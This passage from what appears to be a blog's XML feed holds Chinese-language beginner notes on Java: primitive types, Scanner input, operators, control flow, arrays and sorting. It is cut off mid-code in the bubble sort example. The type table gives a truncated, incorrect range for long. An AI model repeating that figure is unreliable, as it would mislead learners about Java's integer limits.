      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java basic</title>
      <link href="/2024/04/23/java1/"/>
      <url>/2024/04/23/java1/</url>
      
        <content type="html"><![CDATA[<h1 id="java-basic"><a href="#java-basic" class="headerlink" title="java basic"></a>java basic</h1><h2 id="1-面对对象"><a href="#1-面对对象" class="headerlink" title="1.面对对象"></a>1.面对对象</h2><p>1.类和对象</p><p>属性，即可以设置的一些属性</p><p>方法即可以进行的一些行为</p><h2 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h2><p>java中有八种基本类型，这八种都是关键字，在设置变量时不能够用这些关键字。</p><p>这八种分别是：</p><p>整型 （4种）<br>字符型 （1种）<br>浮点型 （2种）<br>布尔型（1种）</p><h3 id="1-整型"><a href="#1-整型" class="headerlink" title="1.整型"></a>1.整型</h3><table><thead><tr><th>类型</th><th>缺省值</th><th>长度</th><th>范围</th></tr></thead><tbody><tr><td>byte</td><td>0</td><td>8</td><td>-128~127</td></tr><tr><td>short</td><td>0</td><td>16</td><td>-32768~32767</td></tr><tr><td>int</td><td>0</td><td>32</td><td>-2147483648~2147483647</td></tr><tr><td>long</td><td>0</td><td>64</td><td>-9223372036854~9223372036854</td></tr></tbody></table><h3 id="2-字符型"><a href="#2-字符型" class="headerlink" title="2.字符型"></a>2.字符型</h3><p>char 类型用于存放一个字符，值用单引号表示（双引号表示字符串）</p><h3 id="3-浮点型"><a href="#3-浮点型" class="headerlink" title="3.浮点型"></a>3.浮点型</h3><p><strong>注意： 默认的小数值是double类型的</strong><br>所以 float f &#x3D; 54.321会出现编译错误，因为54.321的默认类型是 double，其类型 长度为64，超过了float的长度32<br>在数字后面<strong>加一个字母f</strong>，直接把该数字声明成float类型<br>float f2 &#x3D; 54.321<strong>f</strong>,</p><h3 id="4-布尔型"><a href="#4-布尔型" class="headerlink" title="4.布尔型"></a>4.布尔型</h3><p>布尔型表示真假，其长度为1</p><p>true false</p><h3 id="5-Sting"><a href="#5-Sting" class="headerlink" title="5.Sting"></a>5.Sting</h3><h3 id="字面型："><a href="#字面型：" class="headerlink" title="字面型："></a>字面型：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line"><span class="type">char</span> a= <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是转义字符</span></span><br><span class="line"><span class="type">char</span> <span class="variable">tab</span> <span class="operator">=</span> <span class="string">&#x27;\t&#x27;</span>; <span class="comment">//制表符</span></span><br><span class="line"><span class="type">char</span> <span class="variable">carriageReturn</span> <span class="operator">=</span> <span class="string">&#x27;\r&#x27;</span>; <span class="comment">//回车</span></span><br><span class="line"><span class="type">char</span> <span class="variable">newLine</span> <span class="operator">=</span> <span class="string">&#x27;\n&#x27;</span>; <span class="comment">//换行</span></span><br><span class="line"><span class="type">char</span> <span class="variable">doubleQuote</span> <span class="operator">=</span> <span class="string">&#x27;\&quot;&#x27;</span>; <span class="comment">//双引号</span></span><br><span class="line"><span class="type">char</span> <span class="variable">singleQuote</span> <span class="operator">=</span> <span class="string">&#x27;\&#x27;&#x27;</span>; <span class="comment">//单引号</span></span><br><span class="line"><span class="type">char</span> <span class="variable">backslash</span> <span class="operator">=</span> <span class="string">&#x27;\\&#x27;</span>; <span class="comment">//反斜杠</span></span><br></pre></td></tr></table></figure><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>规则：从小到大自动转，从大到小强制转</p><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>如果一个变量，是声明在一个方法上的，就叫做<strong>参数</strong><br>参数的作用域即为该方法内的所有代码<br>其他方法不能访问该参数<br>类里面也不能访问该参数</p><p>声明在方法内的变量，叫做局部变量<br>其作用域在声明开始的位置，到其所处于的块结束位置</p><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>准确的描述是 当一个变量被final修饰的时候，该变量<strong>只有一次赋值的机会</strong></p><h2 id="3-操作符"><a href="#3-操作符" class="headerlink" title="3.操作符"></a>3.操作符</h2><p>scanner操作符（向控制台输入数据）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">float</span> <span class="variable">a</span> <span class="operator">=</span> s.nextFloat();</span><br><span class="line">        System.out.println(<span class="string">&quot;读取的浮点数的值是：&quot;</span>+a);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br></pre></td></tr></table></figure><p>要先引用。</p><p>字符串时LIne</p><p>注意：需要注意的是，如果在通过nextInt()读取了整数后，再接着读取字符串，读出来的是回车换行:”\r\n”,因为nextInt仅仅读取数字信息，而不会<strong>读取</strong>回车换行”\r\n”.</p><p>所以，如果在业务上需要读取了整数后，接着读取字符串，那么就应该连续执行两次nextLine()，第一次是取走回车换行，第二次才是读取真正的字符串import java.util.Scanner;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;读取的整数是&quot;</span>+ i);</span><br><span class="line">        <span class="type">String</span> <span class="variable">rn</span> <span class="operator">=</span> s.nextLine();</span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> s.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;读取的字符串是：&quot;</span>+a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="算数"><a href="#算数" class="headerlink" title="算数"></a>算数</h4><p>如果任何运算单元的长度都不超过int,那么运算结果就按照int来计算</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span> b= <span class="number">2</span>;</span><br><span class="line"><span class="type">byte</span> <span class="variable">c</span> <span class="operator">=</span> (<span class="type">byte</span>) (a+b); <span class="comment">//虽然a b都是byte类型，但是运算结果是int类型，需要进行强制转换</span></span><br><span class="line"><span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>&amp;&amp;与&amp;</p><p>无论长路与还是短路与<br>两边的运算单元都是布尔值<br>都为真时，才为真<br>任意为假，就为假<br>区别<br>长路与 两侧，都会被运算<br>短路与 只要第一个是false，第二个就不进行运算了</p><p>||与|</p><p>无论长路或还是短路或<br>两边的运算单元都是布尔值<br>都为假时，才为假<br>任意为真，就为真<br>区别<br>长路或 两侧都会被运算<br>短路或 只要第一个是true的，第二个就不进行运算了</p><p>！</p><p>取反!<br>真变为假<br>假变为真</p><p>^</p><p>异或^<br>不同，返回真<br>相同，返回假</p><h3 id="位操作符"><a href="#位操作符" class="headerlink" title="位操作符"></a>位操作符</h3><table><thead><tr><th>Integer.toBinaryString()</th><th>一个整数的二进制表达</th><th><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step1066">示例代码</a></th></tr></thead><tbody><tr><td>|</td><td>位或</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step541">示例代码</a></td></tr><tr><td>&amp;</td><td>位与</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step542">示例代码</a></td></tr><tr><td>^</td><td>异或</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step543">示例代码</a></td></tr><tr><td>~</td><td>取非</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step544">示例代码</a></td></tr><tr><td>&lt;&lt; &gt;&gt;</td><td>左移 右移</td><td></td></tr></tbody></table><h4 id="位或"><a href="#位或" class="headerlink" title="位或"></a>位或</h4><p>5的二进制是101<br>6的二进制是110<br>所以 5|6 对每一位进行或运算，得到 111-&gt;7</p><h4 id="位与"><a href="#位与" class="headerlink" title="位与"></a>位与</h4><p>5的二进制是101<br>6的二进制是110<br>所以 5&amp;6 对每一位进行与运算，得到 100-&gt;4</p><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>5的二进制是101<br>6的二进制是110<br>所以 5^6 对每一位进行异或运算，得到 011-&gt;3</p><p>一些特别情况：<br>任何数和自己进行异或 都等于 0<br>任何数和0 进行异或 都等于自己</p><h4 id="取非"><a href="#取非" class="headerlink" title="取非"></a>取非</h4><p>5 的二进制是 00000101<br>所以取反即为 11111010<br>这个二进制换算成十进制即为-6</p><h4 id="左移右移"><a href="#左移右移" class="headerlink" title="左移右移"></a>左移右移</h4><p>左移：根据一个整数的二进制表达，将其每一位都向左移动，最右边一位补0<br>右移：根据一个整数的二进制表达，将其每一位都向右移动</p><h3 id="java三元操作符"><a href="#java三元操作符" class="headerlink" title="java三元操作符"></a>java三元操作符</h3><p>表达式?值1:值2<br>如果表达式为真 返回值1<br>如果表达式为假 返回值2</p><h2 id="4-java控制流程"><a href="#4-java控制流程" class="headerlink" title="4.java控制流程"></a>4.java控制流程</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式<span class="number">1</span>)&#123;</span><br><span class="line">  表达式<span class="number">2</span>；</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">//如果有多个表达式，必须用大括弧包括起来</span></span><br><span class="line"><span class="comment">//如果只有一个表达式可以不用写括弧，看上去会简约一些</span></span><br></pre></td></tr></table></figure><h3 id="if-else语句"><a href="#if-else语句" class="headerlink" title="if else语句"></a>if else语句</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (b)</span><br><span class="line">System.out.println(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">System.out.println(<span class="string">&quot;no&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="else-if-是多条件判断"><a href="#else-if-是多条件判断" class="headerlink" title="else if 是多条件判断"></a>else if 是多条件判断</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果只使用 if,会执行4次判断</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">1</span>)</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">2</span>)</span><br><span class="line">System.out.println(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">3</span>)</span><br><span class="line">System.out.println(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">4</span>)</span><br><span class="line">System.out.println(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果使用else if, 一旦在18行，判断成立， 20行和22行的判断就不会执行了，节约了运算资源</span></span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">1</span>)</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">2</span>)</span><br><span class="line">System.out.println(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">3</span>)</span><br><span class="line">System.out.println(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">4</span>)</span><br><span class="line">System.out.println(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="swich语句"><a href="#swich语句" class="headerlink" title="swich语句"></a>swich语句</h3><p>switch可以使用byte,short,int,char,String,enum</p><p><strong>注:</strong> 每个表达式结束，都应该有一个break;<br><strong>注:</strong> String在Java1.7之前是不支持的, Java从1.7开始支持switch用String的，编译后是把String转化为hash值，其实还是整数</p><h3 id="while和do-while循环"><a href="#while和do-while循环" class="headerlink" title="while和do while循环"></a>while和do while循环</h3><table><thead><tr><th>while</th><th>条件为true时 重复执行</th><th><a href="https://how2j.cn/k/control-flow/control-flow-while/273.html#step560">示例代码</a></th></tr></thead><tbody><tr><td>do while</td><td>条件为true时 重复执行，至少会执行一次</td><td></td></tr></tbody></table><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>和c语言一样 for </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br></pre></td></tr></table></figure><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><p>继续进行下一次循环</p><h3 id="结束循环"><a href="#结束循环" class="headerlink" title="结束循环"></a>结束循环</h3><h4 id="结束当前循环：break"><a href="#结束当前循环：break" class="headerlink" title="结束当前循环：break"></a>结束当前循环：break</h4><h4 id="使用boolean变量结束外部循环"><a href="#使用boolean变量结束外部循环" class="headerlink" title="使用boolean变量结束外部循环"></a>使用boolean变量结束外部循环</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">breakout</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">//是否终止外部循环的标记</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">                System.out.println(i + <span class="string">&quot;:&quot;</span> + j);</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> == j % <span class="number">2</span>) &#123;</span><br><span class="line">                    breakout = <span class="literal">true</span>; <span class="comment">//终止外部循环的标记设置为true</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (breakout) <span class="comment">//判断是否终止外部循环</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用标签结束外部循环"><a href="#使用标签结束外部循环" class="headerlink" title="使用标签结束外部循环"></a>使用标签结束外部循环</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//打印单数    </span></span><br><span class="line">        outloop: <span class="comment">//outloop这个标示是可以自定义的比如outloop1,ol2,out5</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">                System.out.println(i+<span class="string">&quot;:&quot;</span>+j);</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span>==j%<span class="number">2</span>) </span><br><span class="line">                    <span class="keyword">break</span> outloop; <span class="comment">//如果是双数，结束外部循环</span></span><br><span class="line">            &#125;</span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-数组"><a href="#5-数组" class="headerlink" title="5.数组"></a>5.数组</h2><h3 id="声明数组-创建数组"><a href="#声明数组-创建数组" class="headerlink" title="声明数组-创建数组"></a>声明数组-创建数组</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//声明一个引用</span></span><br><span class="line"><span class="type">int</span>[] a; </span><br><span class="line"><span class="comment">//创建一个长度是5的数组，并且使用引用a指向该数组</span></span><br><span class="line">a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] b = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>]; <span class="comment">//声明的同时，指向一个数组</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数组的第一个数是从0开始的，**.length属性**用于访问一个数组的长度<br>数组访问下标范围是0到长度-1<br>一旦超过这个范围,就会产生数组下标越界异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] a; </span><br><span class="line">a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">System.out.println(a.length); <span class="comment">//打印数组的长度</span></span><br><span class="line"></span><br><span class="line">a[<span class="number">4</span>]=<span class="number">100</span>; <span class="comment">//下标4，实质上是“第5个”，即最后一个 </span></span><br><span class="line">a[<span class="number">5</span>]=<span class="number">101</span>; <span class="comment">//下标5，实质上是“第6个”，超出范围 ,产生数组下标越界异常</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随机获得整数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(int) (Math.random() * 100)</span><br></pre></td></tr></table></figure><h3 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h3><p>作为int类型的数组，默认值是0</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//写法一： 分配空间同时赋值</span></span><br><span class="line">        <span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">100</span>,<span class="number">102</span>,<span class="number">444</span>,<span class="number">836</span>,<span class="number">3236</span>&#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//写法二： 省略了new int[],效果一样</span></span><br><span class="line">        <span class="type">int</span>[] b = &#123;<span class="number">100</span>,<span class="number">102</span>,<span class="number">444</span>,<span class="number">836</span>,<span class="number">3236</span>&#125;;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//写法三：同时分配空间，和指定内容</span></span><br><span class="line">        <span class="comment">//在这个例子里，长度是3，内容是5个，产生矛盾了</span></span><br><span class="line">        <span class="comment">//所以如果指定了数组的内容，就不能同时设置数组的长度</span></span><br><span class="line">        <span class="type">int</span>[] c = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>]&#123;<span class="number">100</span>,<span class="number">102</span>,<span class="number">444</span>,<span class="number">836</span>,<span class="number">3236</span>&#125;;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="comment">//排序前，先把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="comment">//选择法排序</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">//第一步： 把第一位和其他所有位进行比较</span></span><br><span class="line">        <span class="comment">//如果发现其他位置的数据比第一位小，就进行交换</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;a[<span class="number">0</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[<span class="number">0</span>];</span><br><span class="line">                a[<span class="number">0</span>] = a[i];</span><br><span class="line">                a[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，最小的一个数，到了最前面</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//第二步： 把第二位的和剩下的所有位进行比较</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;a[<span class="number">1</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[<span class="number">1</span>];</span><br><span class="line">                a[<span class="number">1</span>] = a[i];</span><br><span class="line">                a[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，倒数第二小的数，到了第二个位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">         </span><br><span class="line">        <span class="comment">//可以发现一个规律</span></span><br><span class="line">        <span class="comment">//移动的位置是从0 逐渐增加的</span></span><br><span class="line">        <span class="comment">//所以可以在外面套一层循环</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; a.length-<span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> j+<span class="number">1</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&lt;a[j])&#123;  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[j];</span><br><span class="line">                    a[j] = a[i];</span><br><span class="line">                    a[i] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="comment">//排序前，先把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="comment">//冒泡法排序</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">//第一步：从第一位开始，把相邻两位进行比较</span></span><br><span class="line">        <span class="comment">//如果发现前面的比后面的大，就把大的数据交换在后面</span></span><br><span class="line">          </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length-<span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[i+<span class="number">1</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">                a[i] = a[i+<span class="number">1</span>];</span><br><span class="line">                a[i+<span class="number">1</span>] = 